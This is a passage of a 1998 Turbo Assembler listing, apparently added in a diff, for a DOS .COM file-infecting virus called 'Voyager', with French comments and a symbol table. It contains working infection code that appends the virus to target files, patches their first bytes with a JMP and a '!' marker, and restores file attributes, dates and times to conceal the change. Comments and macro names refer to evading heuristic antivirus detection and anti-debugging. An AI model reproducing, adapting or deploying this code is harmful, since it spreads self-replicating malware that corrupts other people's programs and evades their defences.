+    560	038E  05 0621				     add     ax,offset final - offset virus_start + 100	+ 100h
+    561	0391  72 28				     jc	     short fok_nzend	  ; Saut si taille > 64ko
+    562						     ;D‚termine	si en-tˆte ok
+    563	0393  2E: 80 BE	0490 E9			     cmp     byte ptr cs:[bp+offset start_image-offset virus_start],0E9h  ; Regarde +
+    564				     si	Jmp
+    565	0399  75 08				     jnz     short fok_zend1		  ; Saut si pas	de Jmp
+    566	039B  2E: 80 BE	0493 21			     cmp     byte ptr cs:[bp+offset start_image-offset virus_start+3],'!' ; Compare +
+    567				     avec '!'
+    568	03A1  74 18				     jz	     short fok_nzend		  ; Saut si Jmp	et '!'
+    569						     ;D‚termine	si .exe	camoufl‚ en .com (En 2 fois pour ‚viter	Heuristique)
+    570	03A3  2E: 80 BE	0491 5A	     fok_zend1:	     cmp     byte ptr cs:[bp+offset start_image-offset virus_start+1],'Z' ; Regarde +
+Turbo Assembler	 Version 3.2	    29/08/98 22:59:33	    Page 11
+D:\VIRUS\VOYC.ASM
+
+
+
+    571				     si	'ZM'
+    572	03A9  75 08				     jnz     short fok_zend2		  ; Saut si 'ZM'
+    573	03AB  2E: 80 BE	0490 4D			     cmp     byte ptr cs:[bp+offset start_image-offset virus_start],'M'	  ; Regarde +
+    574				     si	'ZM'
+    575	03B1  74 08				     jz	     short fok_nzend		  ; Saut si 'ZM'
+    576	03B3  E8 000A		     fok_zend2:	     call    infect
+    577	03B6  E8 00D9				     call    rest_attribute_close
+    578	03B9  F9				     stc     ; c=1: Fichier infect‚
+    579	03BA  C3				     ret
+    580	03BB  E8 00D4		     fok_nzend:	     call    rest_attribute_close
+    581	03BE  F8		     fok_erreur:     clc     ; c=0: Erreur ouverture ou	fichier	invalide
+    582	03BF  C3		     retour:	     ret
+    583				     ;****************************************************************************
+    584				     ; Fonction	qui infecte une	victime	choisie	dont le	chemin est dans	usefile
+    585				     ; Entr‚e: BX qui ne doit pas ˆtre modifi‚
+    586				     ;****************************************************************************
+    587	03C0			     infect:	     ;Se place a la fin	du fichier vis‚
+    588	03C0  B8 4202				     mov     ax,4202h
+    589	03C3  33 C9				     xor     cx,cx
+    590	03C5  33 D2				     xor     dx,dx
+    591	03C7  CD 21				     int     21h
+    592	03C9			     recopie:	     ;Copie le code viral de la	m‚moire	… la suite du fichier cible
+    593	03C9  B8 4000				     mov     ax,4000H
+    594	03CC  B9 04BD				     mov     cx,offset final - offset virus_start
+    595	03CF  8B D5				     mov     dx,bp
+    596	03D1  CD 21				     int     21H
+    597						     ;Se place au niveau de code_image de la cible sur disque
+    598	03D3  B8 4200				     mov     ax,4200h
+    599	03D6  33 C9				     xor     cx,cx
+    600	03D8  2E: 8B 96	03D2			     mov     dx,word ptr cs:[bp+offset fsize1-offset virus_start]
+    601	03DD  81 C2 03B4			     add     dx,offset code_image - offset virus_start
+    602	03E1  CD 21				     int     21h
+    603						     ;Ecrit la vrai s‚quence de	d‚but qui a ‚t‚	d‚j… lue et plac‚e dans	start_image
+    604	03E3  B9 4000				     mov     cx,4000h
+    605	03E6  B8 0004				     mov     ax,4
+    606	03E9  91				     xchg    ax,cx
+    607	03EA  8B D5				     mov     dx,bp
+    608	03EC  81 C2 0490			     add     dx,offset start_image-offset virus_start
+    609	03F0  CD 21				     int     21h
+    610						     ;Se replace au d‚but du fichier cible
+    611	03F2  B8 4200				     mov     ax,4200h
+    612	03F5  33 C9				     xor     cx,cx
+    613	03F7  33 D2				     xor     dx,dx
+    614	03F9  CD 21				     int     21h
+    615						     ;Place la fausse s‚quence de d‚but	d'abord	dans start_image
+    616	03FB  2E: C6 86	0490 E9			     mov     byte ptr cs:[bp+offset start_image-offset virus_start],0E9h  ; Place   +
+    617				     l'instruction Jmp
+    618	0401  2E: 8B 86	03D2			     mov     ax,word ptr cs:[bp+offset fsize1-offset virus_start]	  ; Calcule +
+    619				     adresse du	Jmp
+    620	0406  2D 0003				     sub     ax,3
+    621	0409  2E: 89 86	0491			     mov     word ptr cs:[bp+offset start_image-offset virus_start+1],ax  ; Place   +
+    622				     adresse du	Jmp
+    623	040E  2E: C6 86	0493 21			     mov     byte ptr cs:[bp+offset start_image-offset virus_start+3],'!' ; Place '!'
+    624						     ;Ecrit la fausse s‚quence de start_image au d‚but du fichier victime
+    625	0414  B9 4000				     mov     cx,4000h
+    626	0417  B8 0004				     mov     ax,4
+    627	041A  91				     xchg    ax,cx
+Turbo Assembler	 Version 3.2	    29/08/98 22:59:33	    Page 12
+D:\VIRUS\VOYC.ASM
+
+
+
+    628	041B  8B D5				     mov     dx,bp
+    629	041D  81 C2 0490			     add     dx,offset start_image-offset virus_start
+    630	0421  CD 21				     int     21h
+    631						     ;Incr‚mente compteur infection
+    632				     ;		     inc     byte ptr cs:[bp+offset count-offset virus_start]
+    633				     ;----------------------------------------------------------------------------
+    634	0423  9C				     pushf
+    635	0424  53				     push    bx
+    636						     ;Test si mode DEBUG <>0
+    637	0425  2E: 80 BE	04BC 00			     cmp     byte ptr cs:[bp+offset debug-offset virus_start],00h
+    638	042B  74 10				     jz	     short nodebug
+    639						     ;Affiche victime
+    640	042D  2E: C6 86	046A 24			     mov     byte ptr cs:[bp+offset usefile-offset virus_start+40],24h
+    641	0433  8B D5				     mov     dx,bp
+    642	0435  81 C2 0442			     add     dx,offset usefile-offset virus_start
+    643	0439  B4 09				     mov     ah,09h
+    644	043B  CD 21				     int     21h
+    645	043D  5B		     nodebug:	     pop     bx
+    646	043E  9D				     popf
+    647				     ;----------------------------------------------------------------------------
+    648	043F  C3		     exit_infect:    ret
+    649				     ;****************************************************************************
+    650				     ; Fonction	qui ouvre fichier (d‚sactive ses attributs avant)
+    651				     ; Retour: Handle de fichier dans bx
+    652				     ;	       Flag C …	 1:Ok  ou  0:Erreur
+    653				     ;****************************************************************************
+    654	0440			     open_save_attribute: ;Ouvre fichier et sauvegarde attributs.
+    655	0440  B8 4300				     mov     ax,4300h	     ; Fonction	43/00 pour lire	attributs
+    656	0443  8B D5				     mov     dx,bp
+    657	0445  81 C2 0442			     add     dx,offset usefile-offset virus_start
+    658	0449  CD 21				     int     21h
+    659	044B  2E: 88 8E	0439			     mov     byte ptr cs:[bp+offset fattr-offset virus_start],cl ; Sauve cl
+    660	0450  B9 4301				     mov     cx,4301h	     ; Fonction	43/01 pour d‚finir attributs
+    661	0453  33 C0				     xor     ax,ax	     ; Aucun attribut …	1
+    662	0455  91				     xchg    ax,cx
+    663	0456  8B D5				     mov     dx,bp
+    664	0458  81 C2 0442			     add     dx,offset usefile-offset virus_start
+    665	045C  CD 21				     int     21h
+    666	045E  B8 3D02				     mov     ax,3D02h	     ; Ouvre fichier
+    667	0461  8B D5				     mov     dx,bp
+    668	0463  81 C2 0442			     add     dx,offset usefile-offset virus_start
+    669	0467  CD 21				     int     21h
+    670	0469  72 3B				     jc	     short fin_erreur_open   ; Si erreur … l'ouverture
+    671	046B  8B D8				     mov     bx,ax	     ; Sauve handle en bx
+    672	046D  B8 5700				     mov     ax,5700h	     ; Fonction	pour lire heure	et date
+    673	0470  CD 21				     int     21h
+    674	0472  2E: 89 8E	043A			     mov     word ptr cs:[bp+offset ftime-offset virus_start],cx      ;	Sauve heure +
+    675				     en	m‚moire
+    676	0477  2E: 89 96	043C			     mov     word ptr cs:[bp+offset fdate-offset virus_start],dx      ;	Sauve date  +
+    677				     en	m‚moire
+    678	047C  2E: 8B 86	03D2			     mov     ax,word ptr cs:[bp+offset fsize1-offset virus_start]     ;	Sauve taille+
+    679				     en	m‚moire
+    680	0481  2E: 89 86	043E			     mov     word ptr cs:[bp+offset fsize-offset virus_start],ax
+    681	0486  2E: 8B 86	03D4			     mov     ax,word ptr cs:[bp+offset fsize1-offset virus_start+2]
+    682	048B  2E: 89 86	0440			     mov     word ptr cs:[bp+offset fsize-offset virus_start+2],ax
+    683	0490  F9				     stc     ; c=1: Pas	d'erreur … l'ouverture
+    684	0491  C3				     ret
+Turbo Assembler	 Version 3.2	    29/08/98 22:59:33	    Page 13
+D:\VIRUS\VOYC.ASM
+
+
+
+    685				     ;****************************************************************************
+    686				     ; Fonction	qui ferme fichier (restaure attributs ensuite)
+    687				     ; Entr‚e: Handle du fichier dans bx
+    688				     ;****************************************************************************
+    689	0492			     rest_attribute_close: ;Restaure attributs et ferme	fichier.
+    690	0492  B9 5701				     mov     cx,5701h	     ; Restaure	date et	heure
+    691	0495  91				     xchg    ax,cx
+    692	0496  2E: 8B 8E	043A			     mov     cx,cs:[bp+offset ftime-offset virus_start]
+    693	049B  2E: 8B 96	043C			     mov     dx,cs:[bp+offset fdate-offset virus_start]
+    694	04A0  CD 21				     int     21h
+    695	04A2  B4 3E				     mov     ah,3Eh	     ; Ferme le	fichier
+    696	04A4  CD 21				     int     21h
+    697	04A6			     fin_erreur_open:
+    698	04A6  B9 4301				     mov     cx,4301h	     ; Remet anciens attributs
+    699	04A9  91				     xchg    ax,cx
+    700	04AA  2E: 8A 8E	0439			     mov     cl,byte ptr cs:[bp+offset fattr-offset virus_start]
+    701	04AF  8B D5				     mov     dx,bp
+    702	04B1  81 C2 0442			     add     dx,offset usefile-offset virus_start
+    703	04B5  CD 21				     int     21h
+    704	04B7  F8				     clc     ; c=0: Erreur ouverture ou	fermeture termin‚e (utilis‚ par	open_save...)
+    705	04B8  C3				     ret
+    706				     ;****************************************************************************
+    707				     ; Zone du virus o—	sont d‚localis‚es les 4	premiers octets
+    708				     ;****************************************************************************
+    709	04B9  90		     code_image:     nop
+    710	04BA  90				     nop
+    711	04BB  90				     nop
+    712	04BC  90				     nop
+    713				     ;****************************************************************************
+    714				     ; Zone de code inutile … supprimer	(pour test de d‚tection	heuristic)
+    715				     ;****************************************************************************
+    716
+    717
+    718
+    719				     ;****************************************************************************
+    720				     ; Zone de donn‚es incorpor‚e
+    721				     ;****************************************************************************
+    722				     ;dta1   Pour recherche fichiers
+    723	04BD  1A*(??)		     dta1	     db	     26	dup (?)
+    724	04D7  02*(????)		     fsize1	     dw	     2 dup (?)
+    725	04DB  0D*(??)		     fname1	     db	     13	dup (?)
+    726				     ;dta2   Pour recherche r‚pertoires
+    727	04E8  1A*(??)		     dta2	     db	     26	dup (?)
+    728	0502  02*(????)		     fsize2	     dw	     2 dup (?)
+    729	0506  0D*(??)		     fname2	     db	     13	dup (?)
+    730				     ;dta3   Pour recherche r‚pertoires
+    731	0513  1A*(??)		     dta3	     db	     26	dup (?)
+    732	052D  02*(????)		     fsize3	     dw	     2 dup (?)
+    733	0531  0D*(??)		     fname3	     db	     13	dup (?)
+    734				     ;donn‚es de dta
+    735	053E  00		     fattr	     db	     0
+    736	053F  0000		     ftime	     dw	     0
+    737	0541  0000		     fdate	     dw	     0
+    738	0543  00000000		     fsize	     dd	     0
+    739				     ;chemin de	fichier
+    740	0547  4D*(??)		     usefile	     db	     77	dup (?)	;64+'\'+12
+    741	0594  00		     usefileend	     db	     0
+Turbo Assembler	 Version 3.2	    29/08/98 22:59:33	    Page 14
+D:\VIRUS\VOYC.ASM
+
+
+
+    742				     ;autre
+    743				     ;count	     db	     0 ;Compteur d'infection
+    744	0595  00 00 00 00	     start_image     db	     0,0,0,0
+    745	0599  5C 2A 2E 2A 00	     dirtofind	     db	     '\*.*',0	     ; Doit commencer par '\' qu'il faut
+    746	059E  5C 2A 2E 76 6F 6D	00   filetofind	     db	     '\*.vom',0	     ; laisser pour fusions avec chemin
+    747	05A5  0D 0A 56 6F 79 61	67+  message	     db	     0Dh,0Ah,'Voyager (.com) is	here.',0Dh,0Ah,24h
+    748	      65 72 20 28 2E 63	6F+
+    749	      6D 29 20 69 73 20	68+
+    750	      65 72 65 2E 0D 0A	24
+    751	05C1  01		     debug	     db	     1		     ; 0:Non  1:Oui (Affiche victimes)
+    752	05C2			     final:	     ; label to	fix the	end of code to move when virus moves himself
+    753				     end host
+Turbo Assembler	 Version 3.2	    29/08/98 22:59:33	    Page 15
+Symbol Table
+
+
+
+
+Symbol Name			  Type	 Value
+
+??DATE				  Text	 "29/08/98"
+??FILENAME			  Text	 "VOYC	  "
+??TIME				  Text	 "22:59:33"
+??VERSION			  Number 0314
+@32BIT				  Text	 0
+@CODE				  Text	 DGROUP
+@CODESIZE			  Text	 0
+@CPU				  Text	 0101H
+@CURSEG				  Text	 _TEXT
+@DATA				  Text	 DGROUP
+@DATASIZE			  Text	 0
+@FILENAME			  Text	 VOYC
+@INTERFACE			  Text	 00H
+@MODEL				  Text	 1
+@STACK				  Text	 DGROUP
+@WORDSIZE			  Text	 2
+ACTION				  Near	 DGROUP:01C4
+AGAIN				  Near	 DGROUP:0348
+BACK_TO_HOST			  Near	 DGROUP:01E7
+BOUCLE				  Near	 DGROUP:011C
+BOUCLE_TEST			  Near	 DGROUP:0176
+CODE_IMAGE			  Near	 DGROUP:04B9
+CONCAT				  Near	 DGROUP:0352
+CONCAT2				  Near	 DGROUP:035C
+DEBUG				  Byte	 DGROUP:05C1
+DIRTOFIND			  Byte	 DGROUP:0599
+DRIVE_ERROR			  Near	 DGROUP:018B
+DRIVE_OK			  Near	 DGROUP:0194
+DTA1				  Byte	 DGROUP:04BD
+DTA2				  Byte	 DGROUP:04E8
+DTA3				  Byte	 DGROUP:0513
+EXIT_CONCAT			  Near	 DGROUP:0364
+EXIT_INFECT			  Near	 DGROUP:043F
+EXIT_SCAN_REP1			  Near	 DGROUP:0351
+EXIT_SCAN_REP2			  Near	 DGROUP:02EB
+EXIT_SCAN_REP3			  Near	 DGROUP:027E
+FATTR				  Byte	 DGROUP:053E
+FDATE				  Word	 DGROUP:0541
+FILETOFIND			  Byte	 DGROUP:059E
+FILE_OK				  Near	 DGROUP:0365
+FIN				  Near	 DGROUP:0149
+FINAL				  Near	 DGROUP:05C2
+FIND_NEXTREP1			  Near	 DGROUP:032F
+FIND_NEXTREP2			  Near	 DGROUP:02AD
+FIND_NEXTREP3			  Near	 DGROUP:0248
+FIN_ERREUR_OPEN			  Near	 DGROUP:04A6
+FNAME1				  Byte	 DGROUP:04DB
+FNAME2				  Byte	 DGROUP:0506
+FNAME3				  Byte	 DGROUP:0531
+FOK_ERREUR			  Near	 DGROUP:03BE
+FOK_NZEND			  Near	 DGROUP:03BB
+FOK_ZEND1			  Near	 DGROUP:03A3
+FOK_ZEND2			  Near	 DGROUP:03B3
+FSIZE				  Dword	 DGROUP:0543
+Turbo Assembler	 Version 3.2	    29/08/98 22:59:33	    Page 16
+Symbol Table
+
+
+
+FSIZE1				  Word	 DGROUP:04D7
+FSIZE2				  Word	 DGROUP:0502
+FSIZE3				  Word	 DGROUP:052D
+FTIME				  Word	 DGROUP:053F
+GET_START			  Near	 DGROUP:0122
+GO_ON				  Near	 DGROUP:014E
+HOST				  Near	 DGROUP:0100
+INFECT				  Near	 DGROUP:03C0
+MESSAGE				  Byte	 DGROUP:05A5
+NIVEAU1				  Near	 DGROUP:01C1
+NIVEAU2				  Near	 DGROUP:01AE
+NIVEAU3				  Near	 DGROUP:01A4
+NODEBUG				  Near	 DGROUP:043D
+OPEN_SAVE_ATTRIBUTE		  Near	 DGROUP:0440
+RECOPIE				  Near	 DGROUP:03C9
+REPERE_INT			  Near	 DGROUP:0168
+REPERE_INT2			  Near	 DGROUP:01CF
+REPERE_INT3			  Near	 DGROUP:0136
+REP_FOUND2			  Near	 DGROUP:02D8
+REP_FOUND3			  Near	 DGROUP:026B
+REST_ATTRIBUTE_CLOSE		  Near	 DGROUP:0492
+RETOUR				  Near	 DGROUP:03BF
+SCAN_REP1			  Near	 DGROUP:02EC
+SCAN_REP2			  Near	 DGROUP:027F
+SCAN_REP3			  Near	 DGROUP:021A
+SEARCH_FILE			  Near	 DGROUP:02E4
+SEARCH_FILE3			  Near	 DGROUP:0277
+START_IMAGE			  Byte	 DGROUP:0595
+TEST_DRIVE			  Near	 DGROUP:017F
+USEFILE				  Byte	 DGROUP:0547
+USEFILEEND			  Byte	 DGROUP:0594
+VIRUS_END			  Near	 DGROUP:0219
+VIRUS_START			  Near	 DGROUP:0105
+XXX_FOUND2			  Near	 DGROUP:02BF
+XXX_FOUND3			  Near	 DGROUP:025A
+
+Macro Name
+
+ANTIVIRUS_TEST
+BOUCLE_ANTIDEBUG
+FIND_DATE
+FIND_TIME
+RESTOREDTA
+RESTOREPSP
+RESTOREREGISTERS
+SAVEDTA
+SAVEPSP
+SAVEREGISTERS
+WICH_DISK
+
+Groups & Segments		  Bit Size Align  Combine Class
+
+DGROUP				  Group
+  _DATA				  16  0000 Word	  Public  DATA
+  _TEXT				  16  05C2 Word	  Public  CODE
+
